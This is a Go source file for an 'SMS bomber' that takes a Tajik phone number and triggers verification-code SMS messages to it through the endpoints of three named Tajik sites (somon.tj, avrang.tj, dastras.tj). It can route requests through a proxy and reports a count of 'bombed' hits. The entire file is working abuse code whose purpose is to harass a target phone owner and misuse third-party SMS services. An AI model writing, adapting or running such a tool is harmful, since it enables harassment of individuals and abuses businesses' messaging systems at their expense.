package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/jedib0t/go-pretty/v6/table"
)

// SmsBomber struct for performing SMS bombing
type SmsBomber struct {
	PhoneNumber int
	Proxy       string
	Running     bool
	Status      chan ServiceStatus // Channel for storing service status
	Counters    map[string]int     // Counters for successful requests per service
	Mutex       sync.Mutex         // Mutex for thread-safe counter increment
}

// ServiceStatus struct for storing service status
type ServiceStatus struct {
	ServiceName string
	StatusCode  int
	PhoneNumber int
}

func main() {
	phoneNumber := flag.Int("number", 0, "Phone number")
	flag.Parse()

	if *phoneNumber == 0 {
		panic("`go run . -number=(number without +992)`")
	}

	bomber := &SmsBomber{
		PhoneNumber: *phoneNumber,
		Status:      make(chan ServiceStatus), // Initialize the status channel
		Counters:    make(map[string]int),     // Initialize counters map
	}

	// Start the bomber
	go bomber.Start()

	// Wait for interrupt signal (Ctrl+C)
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)

	// Wait for interrupt signal
	<-interrupt

	// Stop the bomber
	bomber.Stop()

	// Print the results
	bomber.PrintResults()
}

// Start method to start the bombing attack
func (b *SmsBomber) Start() {
	b.Running = true
	fmt.Println("Bombing...")

	var wg sync.WaitGroup
	wg.Add(3)

	go b.SomonService(&wg)
	go b.AvrangService(&wg)
	go b.DastrasService(&wg)

	wg.Wait()
	close(b.Status) // Close the status channel after all goroutines finish
}

// Stop method to stop the bombing attack
func (b *SmsBomber) Stop() {
	b.Running = false
	fmt.Println("Stopping the bomber...")
}

// PrintResults method to print the results
func (b *SmsBomber) PrintResults() {
	if !b.Running {
		t := table.NewWriter()
		t.SetOutputMirror(os.Stdout)
		t.AppendHeader(table.Row{"Service", "Status_code", "Phone_number", "Successful_Count"})

		b.Mutex.Lock() // Lock the mutex to prevent data race while accessing counters
		defer b.Mutex.Unlock()

		// Read results from the channel
		for result := range b.Status {
			b.Counters[result.ServiceName]++ // Increment the counter for the corresponding service
			t.AppendRow([]interface{}{result.ServiceName, result.StatusCode, result.PhoneNumber, b.Counters[result.ServiceName]})
		}

		t.Render()
	}
}

// SomonService method for attacking the Somon service
func (b *SmsBomber) SomonService(wg *sync.WaitGroup) {
	defer wg.Done()

	URL := fmt.Sprintf("https://somon.tj/api/items/phone_verify/?phone=+992%d&next=/post_ad/", b.PhoneNumber)
	client := &http.Client{}
	req, err := http.NewRequest("GET", URL, nil)
	if err != nil {
		log.Println(err)
		return
	}

	if b.Proxy != "" {
		proxyURL, err := url.Parse(b.Proxy)
		if err != nil {
			log.Println(err)
			return
		}
		client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}

	serviceName := "Somon"
	statusCode := resp.StatusCode
	b.Status <- ServiceStatus{ServiceName: serviceName, StatusCode: statusCode, PhoneNumber: b.PhoneNumber}

	if statusCode == http.StatusOK {
		fmt.Println("bombed")
	}
}

// AvrangService method for attacking the Avrang service
func (b *SmsBomber) AvrangService(wg *sync.WaitGroup) {
	defer wg.Done()

	URL := "https://api.avrang.tj/api/auth/number-check"
	client := &http.Client{}
	reqBody := map[string]interface{}{
		"phone":        b.PhoneNumber,
		"confirm_code": []interface{}{},
	}
	reqJSON, err := json.Marshal(reqBody)
	if err != nil {
		log.Println(err)
		return
	}

	req, err := http.NewRequest("POST", URL, bytes.NewBuffer(reqJSON))
	if err != nil {
		log.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	if b.Proxy != "" {
		proxyURL, err := url.Parse(b.Proxy)
		if err != nil {
			log.Println(err)
			return
		}
		client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}

	serviceName := "Avrang"
	statusCode := resp.StatusCode
	b.Status <- ServiceStatus{ServiceName: serviceName, StatusCode: statusCode, PhoneNumber: b.PhoneNumber}

	if statusCode == http.StatusOK {
		fmt.Println("bombed")
	}
}

// DastrasService method for attacking the Dastras service
func (b *SmsBomber) DastrasService(wg *sync.WaitGroup) {
	defer wg.Done()

	URL := fmt.Sprintf("https://dastras.tj/index.php?slgh=acm_sms.generate_code&phone=%d&prefix=+992&is_ajax=1", b.PhoneNumber)
	client := &http.Client{}
	req, err := http.NewRequest("GET", URL, nil)
	if err != nil {
		log.Println(err)
		return
	}

	if b.Proxy != "" {
		proxyURL, err := url.Parse(b.Proxy)
		if err != nil {
			log.Println(err)
			return
		}
		client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}

	serviceName := "Dastras"
	statusCode := resp.StatusCode
	b.Status <- ServiceStatus{ServiceName: serviceName, StatusCode: statusCode, PhoneNumber: b.PhoneNumber}

	if statusCode == http.StatusOK {
		fmt.Println("bombed")
	}
}
